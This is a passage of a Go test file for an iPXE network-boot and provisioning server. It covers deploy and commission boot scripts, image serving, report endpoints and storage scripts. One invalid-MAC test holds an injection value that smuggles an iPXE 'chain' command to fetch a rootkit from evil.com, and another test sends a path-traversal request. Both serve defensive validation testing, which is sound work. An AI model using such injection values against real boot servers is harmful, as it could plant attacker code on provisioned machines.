		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "slagworks.expect-uuid="+testUUID) {
		t.Fatalf("expected slagworks.expect-uuid=%s in boot script, got %q", testUUID, body)
	}
}

func TestDeployBootScript_NoCommissionData_ReturnsError(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, &model.Operation{
		ID:        uuid.New(),
		MachineID: machineID,
		Type:      model.OpDeploy,
		Status:    model.OpClaimed,
		Params:    json.RawMessage(`{}`),
	})
	// No commission data set
	p.SetSystemUUID(machineID, "")

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "not commissioned") {
		t.Fatalf("expected error about not commissioned, got %q", body)
	}
	if !strings.Contains(body, "shell") {
		t.Fatalf("expected iPXE shell command in error script, got %q", body)
	}
	if strings.Contains(body, "kernel") {
		t.Fatalf("error script should not contain kernel command, got %q", body)
	}
}

func TestDeployBootScript_NoOpFailsClosed(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetDeployOp(machineID, nil)
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "ERROR:") || !strings.Contains(body, "no active deploy operation") {
		t.Fatalf("expected identity error without deploy op, got %q", body)
	}
}

func TestBootHandler_DeployMode_DeployedMAC_ReturnsBootLocal(t *testing.T) {
	p := newTestProviderKnownMAC()
	machineID, _ := p.MachineIDForMAC(testMAC)
	p.SetSystemUUID(machineID, uuid.NewString())
	p.SetDeployOp(machineID, &model.Operation{
		ID: uuid.New(), MachineID: machineID, Type: model.OpDeploy, Status: model.OpRunning,
	})
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)
	mac := testMAC

	// Before marking deployed — should get deploy script
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if !strings.Contains(w.Body.String(), "slagworks: deploy boot") {
		t.Fatalf("expected deploy script before marking deployed, got %q", w.Body.String())
	}

	// Mark deployed
	p.RecordDeployComplete(machineID, nil)

	// After marking deployed — should get boot-local exit script
	req = httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w = httptest.NewRecorder()
	h.ServeHTTP(w, req)
	body := w.Body.String()
	if !strings.Contains(body, "slagworks: boot-local") {
		t.Fatalf("expected boot-local script after deploy, got %q", body)
	}
	trimmed := strings.TrimSpace(body)
	if !strings.HasSuffix(trimmed, "\nexit") {
		t.Fatalf("expected boot-local script to end with a plain 'exit' (back to the firmware), got %q", trimmed)
	}
}

func TestBootHandler_DeployMode_UnknownMAC_ReturnsBootLocal(t *testing.T) {
	p := newTestProvider()
	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)

	// Unknown MAC must never get a deploy or commission script.
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	body := w.Body.String()
	if strings.Contains(body, "deploy boot") || strings.Contains(body, "commission boot") {
		t.Fatalf("SAFETY: unknown MAC got PXE boot script: %q", body)
	}
	if !strings.Contains(body, "boot-local") {
		t.Fatalf("expected boot-local for unknown MAC, got %q", body)
	}
}

func TestBootHandler_DeployMode_NoDefaultImage_FallsBackToPhase0(t *testing.T) {
	h := NewHandler(HandlerConfig{
		DeployMode: true,
	}, newTestProviderKnownMAC())
	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()

	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "chainload complete") {
		t.Fatalf("expected Phase 0 fallback when no DefaultImage set, got %q", body)
	}
}

func TestBootHandler_CommissionMode_ReturnsCommissionScript(t *testing.T) {
	p := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	p.Register(mac, id)

	// Mark machine as commissioning
	p.SetCommissioning(id)
	p.SetCommissionOp(id, &model.Operation{
		ID: uuid.New(), MachineID: id, Type: model.OpCommission, Status: model.OpRunning,
	})

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)

	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "commission boot") {
		t.Fatalf("expected commission boot script, got %q", body)
	}
	if !strings.Contains(body, "slagworks.mode=commission") {
		t.Fatalf("expected slagworks.mode=commission kernel arg, got %q", body)
	}
	if strings.Contains(body, "overlay.cpio") {
		t.Fatalf("overlay.cpio should be pre-concatenated into initrd, not served separately, got %q", body)
	}
}

func TestBootHandler_CommissionComplete_TransitionsToDeployBoot(t *testing.T) {
	p := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	p.Register(mac, id)

	p.SetCommissioning(id)
	p.SetCommissionOp(id, &model.Operation{
		ID: uuid.New(), MachineID: id, Type: model.OpCommission, Status: model.OpRunning,
	})

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		DeployMode:   true,
	}, p)

	// Verify commission script first
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if !strings.Contains(w.Body.String(), "commission boot") {
		t.Fatalf("expected commission boot before completion, got %q", w.Body.String())
	}

	// Mark commissioned via provider directly (relay does not do local state).
	// The determination sweep resolved during commission and wrote the
	// console config back — without it the deploy boot refuses (no
	// fallback console), which is its own test in ConsoleArgs.
	p.SetCommissioned(id)
	p.SetKernelParams(id, testKernelParams)
	p.SetSystemUUID(id, uuid.NewString())
	p.SetDeployOp(id, &model.Operation{
		ID: uuid.New(), MachineID: id, Type: model.OpDeploy, Status: model.OpRunning,
	})

	req = httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w = httptest.NewRecorder()
	h.ServeHTTP(w, req)
	body := w.Body.String()
	// After commission, the InMemoryProvider sets status to commissioned,
	// which is < deployed, so it returns BootDeploy
	if !strings.Contains(body, "deploy boot") {
		t.Fatalf("expected deploy boot after commission, got %q", body)
	}
}

func TestProvider_SystemUUIDAndScript_AvailableByMAC(t *testing.T) {
	p := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	machID := uuid.New()
	p.Register(mac, machID)

	p.SetCommissioned(machID)
	p.SetSystemUUID(machID, "abcd1234-...")
	p.SetStorageScript(machID, &model.SnapshotStorageScript{
		Name: "100-test", Content: "#!/bin/sh\n",
	})

	if !p.IsCommissioned(machID) {
		t.Fatal("expected commissioned")
	}
	m := p.MachineByMAC(mac)
	if m == nil || m.SystemUUID != "abcd1234-..." {
		t.Fatalf("system UUID: got %+v", m)
	}
	if m.StorageScript == nil || m.StorageScript.Name != "100-test" {
		t.Fatalf("storage script: got %+v", m.StorageScript)
	}
}

func TestImageServer_ServesFile(t *testing.T) {
	dir := t.TempDir()
	imgDir := filepath.Join(dir, "noble")
	os.MkdirAll(imgDir, 0755)
	os.WriteFile(filepath.Join(imgDir, "vmlinuz"), []byte("fake-kernel"), 0644)

	srv := NewServer(":0", ServerConfig{ImagesDir: dir, Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/files/images/noble/vmlinuz", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if w.Body.String() != "fake-kernel" {
		t.Fatalf("expected file content, got %q", w.Body.String())
	}
}

func TestImageServer_404ForMissingFile(t *testing.T) {
	dir := t.TempDir()

	srv := NewServer(":0", ServerConfig{ImagesDir: dir, Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/files/images/noble/vmlinuz", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestImageServer_RejectsPathTraversal(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "secret"), []byte("sensitive"), 0644)
	imgDir := filepath.Join(dir, "images")
	os.MkdirAll(imgDir, 0755)

	srv := NewServer(":0", ServerConfig{ImagesDir: imgDir, Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/files/images/../secret", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code == http.StatusOK && w.Body.String() == "sensitive" {
		t.Fatal("path traversal allowed -- served file outside images dir")
	}
}

func TestDeployReport_MarksMAC(t *testing.T) {
	dir := t.TempDir()
	p := newTestProviderKnownMAC()
	srv := NewServer(":0", ServerConfig{
		ImagesDir:    dir,
		DefaultImage: "noble",
		DeployMode:   true,
		Provider:     p,
	})
	mux := srv.buildMux()

	mac := testMAC
	id, _ := p.MachineIDForMAC(mac)
	opID := uuid.New()
	p.SetSystemUUID(id, uuid.NewString())
	p.SetDeployOp(id, &model.Operation{
		ID: opID, MachineID: id, Type: model.OpDeploy, Status: model.OpRunning,
	})

	// Before report — deploy script
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if !strings.Contains(w.Body.String(), "deploy boot") {
		t.Fatalf("expected deploy script before report, got %q", w.Body.String())
	}

	// Report deploy completion via unified endpoint
	body := `{"machine_id":"` + id.String() + `","op_id":"` + opID.String() + `","event":"deploy_complete"}`
	req = httptest.NewRequest("POST", "/api/v1/report", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 from deploy report, got %d", w.Code)
	}

	// After report — boot local
	req = httptest.NewRequest("GET", "/boot/ipxe?mac="+mac, nil)
	w = httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if !strings.Contains(w.Body.String(), "boot-local") {
		t.Fatalf("expected boot-local after deploy report, got %q", w.Body.String())
	}
}

func TestPhoneHome_MarksVerified(t *testing.T) {
	dir := t.TempDir()
	p := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	p.Register(mac, id)
	opID := uuid.New()
	p.SetDeployOp(id, &model.Operation{
		ID: opID, MachineID: id, Type: model.OpDeploy, Status: model.OpRunning,
	})
	srv := NewServer(":0", ServerConfig{
		ImagesDir:    dir,
		DefaultImage: "noble",
		DeployMode:   true,
		Provider:     p,
	})
	mux := srv.buildMux()

	// Deploy first via unified endpoint
	body := `{"machine_id":"` + id.String() + `","op_id":"` + opID.String() + `","event":"deploy_complete"}`
	req := httptest.NewRequest("POST", "/api/v1/report", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 from deploy report, got %d", w.Code)
	}
	if !p.IsDeployed(id) {
		t.Fatal("expected MAC to be deployed after report")
	}
	if p.IsVerified(id) {
		t.Fatal("MAC should not be verified before phone-home")
	}

	// Phone home via unified endpoint
	body = `{"machine_id":"` + id.String() + `","op_id":"` + opID.String() + `","event":"phone_home"}`
	req = httptest.NewRequest("POST", "/api/v1/report", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 from phone-home, got %d", w.Code)
	}
	if !p.IsVerified(id) {
		t.Fatal("expected MAC to be verified after phone-home")
	}
}

func TestReport_MissingMachineID_Returns400(t *testing.T) {
	dir := t.TempDir()
	srv := NewServer(":0", ServerConfig{ImagesDir: dir, Provider: newTestProvider()})
	mux := srv.buildMux()

	body := `{"event":"phone_home"}`
	req := httptest.NewRequest("POST", "/api/v1/report", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for missing machine_id, got %d", w.Code)
	}
}

func TestBootHandler_InvalidMAC_Returns400(t *testing.T) {
	h := NewHandler(HandlerConfig{}, newTestProvider())

	for _, tc := range []struct{ name, mac string }{
		{"injection", "aa%0achain+http://evil.com/rootkit"},
		{"not-a-mac", "not-a-mac"},
		{"bad-hex", "52:54:00:aa:bb:zz"},
		{"too-short", "52:54:00:aa:bb"},
		{"too-long", "52:54:00:aa:bb:01:extra"},
	} {
		req := httptest.NewRequest("GET", "/boot/ipxe?mac="+tc.mac, nil)
		w := httptest.NewRecorder()
		h.ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Errorf("%s (mac=%s): expected 400, got %d", tc.name, tc.mac, w.Code)
		}
	}
}

func TestReportEndpoints_RejectGET(t *testing.T) {
	dir := t.TempDir()
	srv := NewServer(":0", ServerConfig{ImagesDir: dir, Provider: newTestProvider()})
	mux := srv.buildMux()

	for _, path := range []string{"/api/v1/report"} {
		req := httptest.NewRequest("GET", path, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("GET %s: expected 405, got %d", path, w.Code)
		}
	}
}

func TestReport_InvalidJSON_Returns400(t *testing.T) {
	dir := t.TempDir()
	srv := NewServer(":0", ServerConfig{ImagesDir: dir, Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("POST", "/api/v1/report", strings.NewReader("not json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for invalid JSON, got %d", w.Code)
	}
}

func TestStorageScript_NoScriptsDir_Returns204(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	machineID := uuid.New().String()
	req := httptest.NewRequest("GET", "/api/v1/machines/"+machineID+"/storage-script", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204, got %d", w.Code)
	}
}

func TestStorageScript_NoScriptSet_Returns204(t *testing.T) {
	// Provider has no pre-chosen storage script for the machine.
	provider := newTestProvider()
	srv := NewServer(":0", ServerConfig{Provider: provider})
	mux := srv.buildMux()

	machineID := uuid.New().String()
	req := httptest.NewRequest("GET", "/api/v1/machines/"+machineID+"/storage-script", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204 when no script chosen, got %d", w.Code)
	}
}

func TestStorageScript_ServesPreChosenScript(t *testing.T) {
	// In the new model, script selection happens global-side at snapshot-
	// build time. The worker just serves whatever was selected.
	scriptContent := "#!/bin/bash\n# slagworks:match system_product=QEMU\n# slagworks:priority 100\necho layout\n"

	provider := newTestProvider()
	machID := uuid.New()
	provider.Register("52:54:00:aa:bb:01", machID)
	provider.SetStorageScript(machID, &model.SnapshotStorageScript{
		Name:    "100-qemu",
		Content: scriptContent,
	})

	srv := NewServer(":0", ServerConfig{Provider: provider})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/api/v1/machines/"+machID.String()+"/storage-script", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if w.Body.String() != scriptContent {
		t.Errorf("body mismatch:\n  got:  %q\n  want: %q", w.Body.String(), scriptContent)
	}
}

func TestImageServer_NoImagesDir_BootStillWorks(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/boot/ipxe?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "boot-local") {
		t.Fatalf("expected Phase 0 script when no images configured, got %q", body)
	}
}

func TestSSHKeysEndpoint(t *testing.T) {
	provider := model.NewInMemoryProvider()
	provider.SSHKeys = []string{
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest1 user1@host",
		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest2 user2@host",
	}

	srv := NewServer(":0", ServerConfig{
		DefaultImage: "noble",
		HTTPPort:     8080,
		Provider:     provider,
	})
	mux := srv.buildMux()

	// Returns keys as newline-delimited text
	req := httptest.NewRequest("GET", "/boot/ssh-keys", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if ct := w.Header().Get("Content-Type"); ct != "text/plain" {
		t.Fatalf("expected text/plain, got %q", ct)
	}
	body := w.Body.String()
	lines := strings.Split(strings.TrimSpace(body), "\n")
	if len(lines) != 2 {
		t.Fatalf("expected 2 lines, got %d: %q", len(lines), body)
	}

	// Empty keys returns 204
	provider.SSHKeys = nil
	w = httptest.NewRecorder()
	mux.ServeHTTP(w, httptest.NewRequest("GET", "/boot/ssh-keys", nil))
	if w.Code != http.StatusNoContent {
		t.Fatalf("empty: expected 204, got %d", w.Code)
	}
}

func TestLegacyCommissionEndpointRemoved(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	w := httptest.NewRecorder()
	srv.buildMux().ServeHTTP(w, httptest.NewRequest("POST", "/commission", strings.NewReader(`{}`)))
	if w.Code != http.StatusNotFound {
		t.Fatalf("legacy identity-by-inventory endpoint returned %d, want 404", w.Code)
	}
}

func TestReportEndpointRejectsMachineOperationMismatch(t *testing.T) {
	p := newTestProvider()
	wantMachine, opMachine, opID := uuid.New(), uuid.New(), uuid.New()
	p.Register("52:54:00:aa:bb:01", wantMachine)
	p.Register("52:54:00:aa:bb:02", opMachine)
	p.SetCommissionOp(opMachine, &model.Operation{
		ID: opID, MachineID: opMachine, Type: model.OpCommission, Status: model.OpRunning,
	})
	report := model.ProgressReport{
		OperationID: opID.String(), MachineID: wantMachine.String(), Event: "commission_report",
		CommissionData: json.RawMessage(`{"system":{"serial_number":"SN"}}`),
	}
	body, _ := json.Marshal(report)
	w := httptest.NewRecorder()
	NewServer(":0", ServerConfig{Provider: p}).buildMux().ServeHTTP(
		w, httptest.NewRequest("POST", "/api/v1/report", strings.NewReader(string(body))),
	)
	if w.Code != http.StatusConflict {
		t.Fatalf("mismatched report returned %d, want 409: %s", w.Code, w.Body.String())
	}
	if p.IsCommissioned(wantMachine) || p.IsCommissioned(opMachine) {
		t.Fatal("rejected report changed commission state")
	}
}

func TestPhoneHomeEndpoint_MarksVerified(t *testing.T) {
	p := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	p.Register(mac, id)

	srv := NewServer(":0", ServerConfig{
		DefaultImage: "noble",
		DeployMode:   true,
		Provider:     p,
	})
	mux := srv.buildMux()

	// Mark deployed first
	p.RecordDeployComplete(id, nil)
	if !p.IsDeployed(id) {
		t.Fatal("expected deployed before phone-home test")
	}
	if p.IsVerified(id) {
		t.Fatal("should not be verified before phone-home")
	}

	// POST /api/v1/phone-home?mac=...
	req := httptest.NewRequest("POST", "/api/v1/phone-home?mac="+mac, nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if !p.IsVerified(id) {
		t.Fatal("expected machine to be verified after phone-home")
	}
}

func TestPhoneHomeEndpoint_MissingMAC_Returns400(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("POST", "/api/v1/phone-home", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for missing MAC, got %d", w.Code)
	}
}

func TestPhoneHomeEndpoint_InvalidMAC_Returns400(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("POST", "/api/v1/phone-home?mac=not-a-mac", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for invalid MAC, got %d", w.Code)
	}
}

func TestPhoneHomeEndpoint_RejectGET(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/api/v1/phone-home?mac=52:54:00:aa:bb:01", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("expected 405 for GET, got %d", w.Code)
	}
}

func TestBootStorageScript_ReturnsPreChosenScript(t *testing.T) {
	scriptContent := "#!/bin/bash\n# slagworks:match system_product=QEMU\n# slagworks:priority 100\necho layout\n"
	provider := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	provider.Register(mac, id)
	provider.SetStorageScript(id, &model.SnapshotStorageScript{
		Name:    "100-qemu",
		Content: scriptContent,
	})

	srv := NewServer(":0", ServerConfig{Provider: provider})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/boot/storage-script?mac="+mac, nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if ct := w.Header().Get("Content-Type"); ct != "text/plain" {
		t.Fatalf("expected Content-Type text/plain, got %q", ct)
	}
	if w.Body.String() != scriptContent {
		t.Errorf("body mismatch:\n  got:  %q\n  want: %q", w.Body.String(), scriptContent)
	}
}

func TestBootStorageScript_NoScriptSet_Returns204(t *testing.T) {
	provider := newTestProvider()
	mac := "52:54:00:aa:bb:01"
	id := uuid.New()
	provider.Register(mac, id)

	srv := NewServer(":0", ServerConfig{Provider: provider})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/boot/storage-script?mac="+mac, nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204 when no script chosen, got %d", w.Code)
	}
}

func TestBootStorageScript_MissingMAC_Returns400(t *testing.T) {
	srv := NewServer(":0", ServerConfig{Provider: newTestProvider()})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/boot/storage-script", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for missing MAC, got %d", w.Code)
	}
}

func TestStaticFileServing_SlagworksAgent(t *testing.T) {
	dir := t.TempDir()
	// The handler reads via the AgentBinPath callback rather than
	// imagesDir, since real workers serve from /usr/bin/slagworks-agent
	// (placed by the slagworks .deb on the gateway), not the boot-images
	// dir.
	binPath := filepath.Join(dir, "slagworks-agent")
	os.WriteFile(binPath, []byte("fake-agent-binary"), 0644)

	srv := NewServer(":0", ServerConfig{
		ImagesDir:    dir,
		Provider:     newTestProvider(),
		AgentBinPath: func() string { return binPath },
	})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/files/bin/slagworks-agent", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if w.Body.String() != "fake-agent-binary" {
		t.Fatalf("expected agent binary content, got %q", w.Body.String())
	}
}

// AgentBinPath returning "" signals the binary isn't configured. The
// handler must 503 with a Retry-After hint so booting hosts loop
// cheaply on the BOOT hook's slagworks_download retry without bricking
// on a 500.
func TestStaticFileServing_SlagworksAgentNotReady(t *testing.T) {
	dir := t.TempDir()
	srv := NewServer(":0", ServerConfig{
		ImagesDir:    dir,
		Provider:     newTestProvider(),
		AgentBinPath: func() string { return "" },
	})
	mux := srv.buildMux()

	req := httptest.NewRequest("GET", "/files/bin/slagworks-agent", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusServiceUnavailable {
		t.Fatalf("expected 503, got %d", w.Code)
	}
	if got := w.Header().Get("Retry-After"); got == "" {
		t.Fatal("expected Retry-After header")
	}
}

func TestResolveImageName_UsesDefaultImageVerbatim(t *testing.T) {
	// There is one image; both deploy and commission boot it. resolveImageName
	// returns DefaultImage verbatim (no per-kind suffix), so the boot URLs serve
	// /images/<DefaultImage>/ regardless of mode.
	inner := newTestProviderKnownMAC()
	machineID, _ := inner.MachineIDForMAC(testMAC)
	inner.SetCommissioning(machineID)

	h := NewHandler(HandlerConfig{
		DefaultImage: "noble-pxe",
		HTTPPort:     8080,
		DeployMode:   true,
	}, inner)
	req := httptest.NewRequest("GET", "/boot/ipxe?mac="+testMAC, nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	body := w.Body.String()
	if !strings.Contains(body, "/images/noble-pxe/") {
		t.Fatalf("expected /images/noble-pxe/ in boot URLs, got %q", body)
	}
}

func TestInventoryEndpoint_AcceptsReport(t *testing.T) {
	machineID := uuid.New()
	p := model.NewInMemoryProvider()
	p.Register("3c:ec:ef:aa:bb:01", machineID)

	srv := NewServer(":0", ServerConfig{Provider: p})
	mux := srv.buildMux()

	body := `{"system":{"serial_number":"SN001","uuid":"test-uuid"},"nics":[{"mac":"3c:ec:ef:aa:bb:01"}]}`
	req := httptest.NewRequest("POST", "/api/v1/inventory", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestInventoryEndpoint_UnknownMachine_ForwardsToGlobal(t *testing.T) {
	p := model.NewInMemoryProvider() // no machines registered

	srv := NewServer(":0", ServerConfig{Provider: p})
	mux := srv.buildMux()

	body := `{"nics":[{"mac":"aa:bb:cc:dd:ee:ff"}]}`
	req := httptest.NewRequest("POST", "/api/v1/inventory", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	// Unknown MACs are accepted for inventory (forwarded with nil machine ID
	// for global to resolve). PXE boot endpoints still reject unknown MACs.
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 for unknown MAC inventory, got %d: %s", w.Code, w.Body.String())
	}
}

func TestInventoryEndpoint_ResolvesbyUUID(t *testing.T) {
	machineID := uuid.New()
	p := model.NewInMemoryProvider()
	// Machine registered with MAC
	p.Register("3c:ec:ef:aa:bb:02", machineID)

	srv := NewServer(":0", ServerConfig{Provider: p})
	mux := srv.buildMux()

	// Request includes both system UUID and matching NIC MAC
	body := `{"system":{"uuid":"some-smbios-uuid"},"nics":[{"mac":"3c:ec:ef:aa:bb:02"}]}`
	req := httptest.NewRequest("POST", "/api/v1/inventory", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}
